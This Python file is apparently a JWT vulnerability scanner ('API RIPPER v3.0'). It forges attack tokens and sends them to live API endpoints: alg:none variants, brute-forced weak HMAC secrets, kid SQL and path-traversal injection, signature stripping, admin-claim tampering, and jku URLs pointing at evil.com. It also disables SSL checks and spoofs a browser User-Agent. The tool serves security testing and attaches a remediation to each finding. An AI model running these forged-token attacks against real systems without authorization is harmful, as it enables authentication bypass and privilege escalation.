"""
API RIPPER v3.0 — Advanced JWT Attack Scanner
Comprehensive JWT vulnerability detection for modern APIs.

Detects:
  - alg:none bypass (all case variants)
  - Weak HMAC secrets (brute-force top 1000)
  - kid header injection (SQLi, path traversal)
  - jku/x5u header injection
  - Token confusion (RS256 → HS256)
  - Expired token bypass
  - Missing signature validation
  - Claim tampering (role escalation)
"""

import asyncio
import json
import logging
import time
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import aiohttp

logger = logging.getLogger(__name__)


async def advanced_jwt_scan(target_url: str, auth_config: dict = None, options: dict = None) -> List[Dict]:
    """
    Run comprehensive JWT security analysis.
    
    Args:
        target_url: Base URL of the target API
        auth_config: Authentication config with bearer_token, api_key, cookies
        options: Scan options (timeout, max_requests, etc.)
    
    Returns:
        List of findings dicts
    """
    scanner = AdvancedJWTScanner(target_url, auth_config or {}, options or {})
    return await scanner.scan()


class AdvancedJWTScanner:
    """Production-grade JWT vulnerability scanner."""
    
    def __init__(self, target_url: str, auth_config: dict, options: dict):
        self.target_url = target_url.rstrip('/')
        self.auth_config = auth_config
        self.options = options
        self.findings = []
        self.jwt_token = auth_config.get("bearer_token", "")
        self.timeout = aiohttp.ClientTimeout(total=options.get("timeout", 15))
        self._request_delay = options.get("delay_ms", 100) / 1000.0
        
        # Discovered endpoints that accept JWTs
        self.jwt_endpoints = []
        
    async def scan(self) -> List[Dict]:
        """Execute all JWT attack vectors."""
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, */*",
        }
        
        try:
            async with aiohttp.ClientSession(
                timeout=self.timeout, headers=headers, connector=connector
            ) as session:
                # Phase 1: Discover JWT-protected endpoints
                await self._discover_jwt_endpoints(session)
                
                # Phase 2: Extract and analyze existing JWT
                jwt_analysis = self._analyze_jwt()
                if jwt_analysis:
                    self.findings.append(jwt_analysis)
                
                # Phase 3: Test alg:none bypass
                await self._test_alg_none(session)
                
                # Phase 4: Test weak HMAC secrets
                await self._test_weak_secrets(session)
                
                # Phase 5: Test kid header injection
                await self._test_kid_injection(session)
                
                # Phase 6: Test expired token acceptance
                await self._test_expired_token(session)
                
                # Phase 7: Test missing signature validation
                await self._test_missing_signature(session)
                
                # Phase 8: Test claim tampering
                await self._test_claim_tampering(session)
                
                # Phase 9: Test jku injection
                await self._test_jku_injection(session)
        except asyncio.CancelledError:
            logger.warning("[jwt_scanner] Cancelled — returning partial results")
        except Exception as e:
            logger.error(f"[jwt_scanner] Error: {e}")
            
        return self.findings
    
    async def _discover_jwt_endpoints(self, session):
        """Find endpoints that require/accept JWT authentication."""
        from backend.agents.modern_payloads import decode_jwt_unsafe
        
        test_paths = [
            "/api/v1/me", "/api/v1/profile", "/api/v1/users",
            "/api/v1/admin", "/api/v1/dashboard", "/api/v1/account",
            "/api/me", "/api/profile", "/api/users", "/api/user",
            "/api/v2/me", "/api/v2/users",
            "/user", "/users", "/profile", "/account",
            "/api/v1/orders", "/api/v1/settings",
        ]
        
        parsed = urlparse(self.target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in test_paths:
            url = f"{base}{path}"
            try:
                await asyncio.sleep(self._request_delay)
                # Test without auth
                async with session.get(url) as resp:
                    no_auth_status = resp.status
                
                # Test with auth (if we have a token)
                if self.jwt_token:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(url, headers={"Authorization": f"Bearer {self.jwt_token}"}) as resp:
                        auth_status = resp.status
                    
                    # If unauthenticated returns 401/403 but authenticated returns 200, it's JWT-protected
                    if no_auth_status in (401, 403) and auth_status == 200:
                        self.jwt_endpoints.append(url)
                elif no_auth_status in (401, 403):
                    # We don't have a token but endpoint requires auth — still testable
                    self.jwt_endpoints.append(url)
                    
            except Exception:
                continue
        
        # If no endpoints found, use the target URL itself
        if not self.jwt_endpoints:
            self.jwt_endpoints = [self.target_url]
    
    def _analyze_jwt(self) -> Optional[Dict]:
        """Analyze the provided JWT for weaknesses."""
        from backend.agents.modern_payloads import decode_jwt_unsafe
        
        if not self.jwt_token:
            return None
        
        decoded = decode_jwt_unsafe(self.jwt_token)
        if not decoded:
            return None
        
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})
        issues = []
        
        # Check algorithm
        alg = header.get("alg", "")
        if alg.lower() in ("none", ""):
            issues.append("Algorithm set to 'none' — signatures not required")
        if alg in ("HS256", "HS384", "HS512"):
            issues.append(f"HMAC algorithm ({alg}) — susceptible to brute-force if weak secret")
        
        # Check claims
        if "exp" not in payload:
            issues.append("No expiration claim (exp) — token never expires")
        elif payload["exp"] < time.time():
            issues.append(f"Token is expired (exp: {payload['exp']})")
        
        if "iat" not in payload:
            issues.append("No issued-at claim (iat)")
        
        if "nbf" not in payload:
            issues.append("No not-before claim (nbf)")
        
        # Check for sensitive data
        sensitive_keys = ["password", "secret", "ssn", "credit_card", "api_key", "private_key"]
        for key in sensitive_keys:
            if key in str(payload).lower():
                issues.append(f"Sensitive data in JWT payload: '{key}'")
        
        # Check kid header
        if "kid" in header:
            issues.append(f"kid header present: '{header['kid']}' — test for injection")
        
        # Check jku/x5u
        if "jku" in header:
            issues.append(f"jku header present: '{header['jku']}' — test for URL injection")
        if "x5u" in header:
            issues.append(f"x5u header present: '{header['x5u']}' — test for URL injection")
        
        if issues:
            return {
                "type": "jwt_analysis",
                "title": "JWT Token Weakness Analysis",
                "description": f"JWT analysis revealed {len(issues)} potential weaknesses: " + "; ".join(issues),
                "severity": "medium" if len(issues) < 3 else "high",
                "confidence": 0.9,
                "endpoint": self.target_url,
                "cwe": "CWE-287",
                "owasp": "API2:2023",
                "remediation": "Use strong signing algorithms (RS256/ES256). Set expiration claims. Avoid storing sensitive data in JWT payloads.",
                "evidence": [{"header": header, "claims": payload, "issues": issues}],
                "category": "JWT Security",
            }
        return None
    
    async def _test_alg_none(self, session):
        """Test alg:none bypass with all case variants."""
        from backend.agents.modern_payloads import forge_jwt_none_variants, JWT_ADMIN_CLAIMS
        
        tokens = forge_jwt_none_variants(JWT_ADMIN_CLAIMS)
        evidence = []
        
        for endpoint in self.jwt_endpoints[:3]:
            for token in tokens:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token}"}
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="replace")
                            # Verify it's not just a public endpoint
                            async with session.get(endpoint) as no_auth:
                                if no_auth.status in (401, 403):
                                    evidence.append({
                                        "technique": "alg_none_bypass",
                                        "token": token[:80] + "...",
                                        "endpoint": endpoint,
                                        "status": resp.status,
                                        "body_preview": body[:200],
                                    })
                except Exception:
                    continue
        
        if evidence:
            self.findings.append({
                "type": "jwt_alg_none_bypass",
                "title": "JWT Algorithm None Bypass — CRITICAL",
                "description": f"The API accepts JWTs with alg:none, allowing complete authentication bypass. {len(evidence)} endpoints confirmed vulnerable.",
                "severity": "critical",
                "confidence": 0.95,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-327",
                "owasp": "API2:2023",
                "remediation": "Reject JWTs with alg:none. Always validate the algorithm server-side against a whitelist. Never trust the alg header from the token.",
                "evidence": evidence,
                "category": "JWT Security",
            })
    
    async def _test_weak_secrets(self, session):
        """Test for weak HMAC signing secrets."""
        from backend.agents.modern_payloads import forge_jwt_weak_hmac, JWT_ADMIN_CLAIMS
        
        weak_tokens = forge_jwt_weak_hmac(JWT_ADMIN_CLAIMS)
        evidence = []
        
        for endpoint in self.jwt_endpoints[:2]:
            for token_data in weak_tokens:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token_data['token']}"}
                    ) as resp:
                        if resp.status == 200:
                            # Verify not public
                            async with session.get(endpoint) as no_auth:
                                if no_auth.status in (401, 403):
                                    evidence.append({
                                        "technique": "weak_hmac_secret",
                                        "secret": token_data["secret"],
                                        "endpoint": endpoint,
                                        "status": resp.status,
                                    })
                                    break  # Found weak secret, stop brute-forcing
                except Exception:
                    continue
            if evidence:
                break
        
        if evidence:
            self.findings.append({
                "type": "jwt_weak_secret",
                "title": f"JWT Weak HMAC Secret: '{evidence[0]['secret']}'",
                "description": f"The JWT signing secret is weak ('{evidence[0]['secret']}'). An attacker can forge valid tokens with arbitrary claims.",
                "severity": "critical",
                "confidence": 0.95,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-326",
                "owasp": "API2:2023",
                "remediation": "Use a cryptographically random secret of at least 256 bits. Consider switching to asymmetric algorithms (RS256/ES256).",
                "evidence": evidence,
                "category": "JWT Security",
            })
    
    async def _test_kid_injection(self, session):
        """Test kid header injection attacks."""
        from backend.agents.modern_payloads import forge_jwt_kid_injection, JWT_ADMIN_CLAIMS
        
        kid_tokens = forge_jwt_kid_injection(JWT_ADMIN_CLAIMS)
        evidence = []
        
        for endpoint in self.jwt_endpoints[:2]:
            for token_data in kid_tokens:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token_data['token']}"}
                    ) as resp:
                        body = await resp.text(errors="replace")
                        
                        if resp.status == 200:
                            # Check if this is authentication bypass
                            async with session.get(endpoint) as no_auth:
                                if no_auth.status in (401, 403):
                                    evidence.append({
                                        "technique": "kid_injection",
                                        "kid_payload": token_data["kid"],
                                        "attack_type": token_data["desc"],
                                        "endpoint": endpoint,
                                        "status": resp.status,
                                    })
                        
                        # Check for SQL errors (even in non-200 responses)
                        sql_errors = ["syntax error", "sql", "mysql", "postgresql", "sqlite", "oracle", "mssql"]
                        if any(err in body.lower() for err in sql_errors):
                            evidence.append({
                                "technique": "kid_sqli_error",
                                "kid_payload": token_data["kid"],
                                "endpoint": endpoint,
                                "status": resp.status,
                                "error_detected": True,
                                "body_preview": body[:300],
                            })
                            
                except Exception:
                    continue
        
        if evidence:
            severity = "critical" if any(e.get("technique") == "kid_injection" for e in evidence) else "high"
            self.findings.append({
                "type": "jwt_kid_injection",
                "title": "JWT kid Header Injection Vulnerability",
                "description": f"The JWT kid header parameter is vulnerable to injection attacks. {len(evidence)} injection vectors confirmed.",
                "severity": severity,
                "confidence": 0.85,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-89",
                "owasp": "API2:2023",
                "remediation": "Sanitize the kid header. Use a whitelist of valid key IDs. Never use kid in file paths or SQL queries directly.",
                "evidence": evidence,
                "category": "JWT Security",
            })
    
    async def _test_expired_token(self, session):
        """Test if expired JWTs are accepted."""
        from backend.agents.modern_payloads import forge_jwt_none, JWT_EXPIRED_CLAIMS
        import hmac, hashlib, base64
        
        # Forge expired token
        expired_claims = JWT_EXPIRED_CLAIMS.copy()
        
        # Try with the existing token's algorithm if we have one
        if self.jwt_token:
            from backend.agents.modern_payloads import decode_jwt_unsafe
            decoded = decode_jwt_unsafe(self.jwt_token)
            if decoded and decoded.get("payload", {}).get("exp"):
                # Modify the existing token's exp to past
                original_payload = decoded["payload"].copy()
                original_payload["exp"] = int(time.time()) - 86400
                
                # Re-encode with same header
                header_b64 = self.jwt_token.split('.')[0]
                payload_b64 = __import__('base64').urlsafe_b64encode(
                    json.dumps(original_payload).encode()
                ).rstrip(b'=').decode()
                # Keep original signature (test if exp is validated)
                original_sig = self.jwt_token.split('.')[2] if len(self.jwt_token.split('.')) > 2 else ""
                expired_token = f"{header_b64}.{payload_b64}.{original_sig}"
                
                for endpoint in self.jwt_endpoints[:2]:
                    try:
                        await asyncio.sleep(self._request_delay)
                        async with session.get(
                            endpoint,
                            headers={"Authorization": f"Bearer {expired_token}"}
                        ) as resp:
                            if resp.status == 200:
                                self.findings.append({
                                    "type": "jwt_expired_accepted",
                                    "title": "Expired JWT Token Accepted",
                                    "description": "The API accepts expired JWT tokens. This means stolen tokens remain valid indefinitely.",
                                    "severity": "high",
                                    "confidence": 0.85,
                                    "endpoint": endpoint,
                                    "cwe": "CWE-613",
                                    "owasp": "API2:2023",
                                    "remediation": "Always validate the exp claim server-side. Implement token revocation. Use short-lived tokens with refresh tokens.",
                                    "evidence": [{"expired_token": expired_token[:80] + "...", "status": resp.status}],
                                    "category": "JWT Security",
                                })
                                return
                    except Exception:
                        continue
    
    async def _test_missing_signature(self, session):
        """Test if JWT signature validation is enforced."""
        if not self.jwt_token:
            return
        
        parts = self.jwt_token.split('.')
        if len(parts) < 3:
            return
        
        # Strip signature
        no_sig_token = f"{parts[0]}.{parts[1]}."
        # Corrupt signature
        corrupt_sig = parts[2][::-1] if parts[2] else "invalid_signature"
        corrupt_token = f"{parts[0]}.{parts[1]}.{corrupt_sig}"
        
        test_tokens = [
            ("no_signature", no_sig_token),
            ("corrupt_signature", corrupt_token),
        ]
        
        evidence = []
        for endpoint in self.jwt_endpoints[:2]:
            for technique, token in test_tokens:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token}"}
                    ) as resp:
                        if resp.status == 200:
                            # Verify endpoint actually requires auth
                            async with session.get(endpoint) as no_auth:
                                if no_auth.status in (401, 403):
                                    evidence.append({
                                        "technique": technique,
                                        "endpoint": endpoint,
                                        "status": resp.status,
                                    })
                except Exception:
                    continue
        
        if evidence:
            self.findings.append({
                "type": "jwt_missing_signature_validation",
                "title": "JWT Signature Validation Missing",
                "description": f"The API does not validate JWT signatures. Tokens with missing or corrupt signatures are accepted.",
                "severity": "critical",
                "confidence": 0.95,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-347",
                "owasp": "API2:2023",
                "remediation": "Always validate JWT signatures server-side. Reject tokens with missing, invalid, or mismatched signatures.",
                "evidence": evidence,
                "category": "JWT Security",
            })
    
    async def _test_claim_tampering(self, session):
        """Test if JWT claims can be tampered to escalate privileges."""
        from backend.agents.modern_payloads import forge_jwt_none, JWT_ADMIN_CLAIMS
        
        if not self.jwt_token:
            return
        
        from backend.agents.modern_payloads import decode_jwt_unsafe
        decoded = decode_jwt_unsafe(self.jwt_token)
        if not decoded:
            return
        
        original_payload = decoded.get("payload", {})
        
        # Create escalated claims
        escalated_payloads = [
            {**original_payload, "role": "admin", "is_admin": True},
            {**original_payload, "permissions": ["*"]},
            {**original_payload, "group": "administrators"},
            {**original_payload, "scope": "admin read write"},
        ]
        
        evidence = []
        for claims in escalated_payloads:
            token = forge_jwt_none(claims)
            for endpoint in self.jwt_endpoints[:2]:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token}"}
                    ) as resp:
                        if resp.status == 200:
                            # Get baseline with original token
                            async with session.get(
                                endpoint,
                                headers={"Authorization": f"Bearer {self.jwt_token}"}
                            ) as baseline:
                                baseline_body = await baseline.text(errors="replace")
                                tampered_body = await resp.text(errors="replace")
                                
                                # If tampered response has MORE data, escalation may have worked
                                if len(tampered_body) > len(baseline_body) * 1.2:
                                    evidence.append({
                                        "technique": "claim_tampering",
                                        "tampered_claims": {k: v for k, v in claims.items() if k not in original_payload or claims[k] != original_payload.get(k)},
                                        "endpoint": endpoint,
                                        "baseline_length": len(baseline_body),
                                        "tampered_length": len(tampered_body),
                                    })
                except Exception:
                    continue
        
        if evidence:
            self.findings.append({
                "type": "jwt_claim_tampering",
                "title": "JWT Claim Tampering — Privilege Escalation",
                "description": f"JWT claims can be tampered to escalate privileges. Forged admin claims returned expanded data.",
                "severity": "critical",
                "confidence": 0.8,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-269",
                "owasp": "API2:2023",
                "remediation": "Validate all JWT claims server-side. Never trust client-supplied role/permission claims. Use server-side session stores for authorization data.",
                "evidence": evidence,
                "category": "JWT Security",
            })
    
    async def _test_jku_injection(self, session):
        """Test jku header injection (URL validation bypass)."""
        from backend.agents.modern_payloads import forge_jwt_jku_injection, JWT_ADMIN_CLAIMS
        
        jku_urls = [
            "https://evil.com/.well-known/jwks.json",
            f"{self.target_url}@evil.com/.well-known/jwks.json",
            f"https://evil.com#{self.target_url}/.well-known/jwks.json",
        ]
        
        evidence = []
        for jku_url in jku_urls:
            token = forge_jwt_jku_injection(JWT_ADMIN_CLAIMS, jku_url)
            for endpoint in self.jwt_endpoints[:1]:
                try:
                    await asyncio.sleep(self._request_delay)
                    async with session.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token}"}
                    ) as resp:
                        # A 200 would indicate the server tried to fetch the jku URL
                        # Even a timeout or error different from 401 could indicate jku processing
                        if resp.status not in (401, 403):
                            evidence.append({
                                "technique": "jku_injection",
                                "jku_url": jku_url,
                                "endpoint": endpoint,
                                "status": resp.status,
                            })
                except Exception:
                    continue
        
        if evidence:
            self.findings.append({
                "type": "jwt_jku_injection",
                "title": "JWT jku Header Injection",
                "description": "The API processes the jku header from JWT tokens, potentially fetching keys from attacker-controlled URLs.",
                "severity": "high",
                "confidence": 0.6,
                "endpoint": evidence[0]["endpoint"],
                "cwe": "CWE-918",
                "owasp": "API2:2023",
                "remediation": "Whitelist allowed jku/x5u URLs. Validate that key URLs match expected domains. Prefer static key configuration.",
                "evidence": evidence,
                "category": "JWT Security",
            })
